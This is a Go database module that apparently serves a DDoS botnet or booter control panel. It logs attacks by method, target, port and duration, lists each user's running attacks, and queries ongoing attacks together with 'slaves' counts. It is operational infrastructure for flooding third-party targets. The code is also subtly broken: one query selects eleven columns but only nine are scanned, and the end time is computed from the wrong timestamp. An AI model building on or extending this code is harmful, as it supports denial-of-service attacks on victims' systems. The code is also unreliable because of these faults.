package db

import (
	"database/sql"
	"log"
	"time"
)

//Attack represents a attack logged in the database
type Attack struct {
	ID   int
	User int

	Created  int64
	Method   string
	Target   string
	Port     int
	Duration int
	End      int64
	Username string
}

//RunningAttacks returns a list of all running attacks from this user
func (user *User) RunningAttacks() ([]*Attack, error) {
	var attacks []*Attack
	rows, err := SQL.Query("SELECT `id`, `user`, `created`, `method`, `target`, `port`, `duration`, `end`, `username` FROM  `attacks` WHERE `user` = ? AND `end` > ?", user.ID, time.Now().Unix())
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}

		return attacks, err
	}

	defer rows.Close()

	for rows.Next() {
		attack := &Attack{}
		if err := scanAttacks(rows, attack); err != nil {
			log.Println("db/RunningAttacks:", err)
			continue
		}

		attacks = append(attacks, attack)
	}

	return attacks, nil
}

func OngoingAttacks() ([]*Attack, error) {
	var attacks []*Attack
	rows, err := SQL.Query("SELECT `id`, `user`, `created`, `method`, `target`, `port`, `duration`, `end`, `username`, `slaves`, `sessionUptime` FROM  `attacks` WHERE  `end` > ?", time.Now().Unix())
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}

		return attacks, err
	}

	defer rows.Close()

	for rows.Next() {
		attack := &Attack{}
		if err := scanAttacks(rows, attack); err != nil {
			log.Println("db/RunningAttacks:", err)
			continue
		}

		attacks = append(attacks, attack)
	}

	return attacks, nil
}

func scanAttacks(row *sql.Rows, attack *Attack) error {

	return row.Scan(
		&attack.ID,
		&attack.User,
		&attack.Created,
		&attack.Method,
		&attack.Target,
		&attack.Port,
		&attack.Duration,
		&attack.End,
		&attack.Username,
	)
}

//LogAttack will create a new log in the database
func LogAttack(user *User, attack *Attack) error {

	rows, err := SQL.Query("INSERT INTO `attacks` (`user`, `created`, `method`, `target`, `port`, `duration`, `end`, `username`) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
		user.ID,
		time.Now().Unix(),
		attack.Method,
		attack.Target,
		attack.Port,
		attack.Duration,
		attack.Created+int64(attack.Duration),
		user.Username,
	)
	if rows != nil {
		rows.Close()
	}

	return err
}
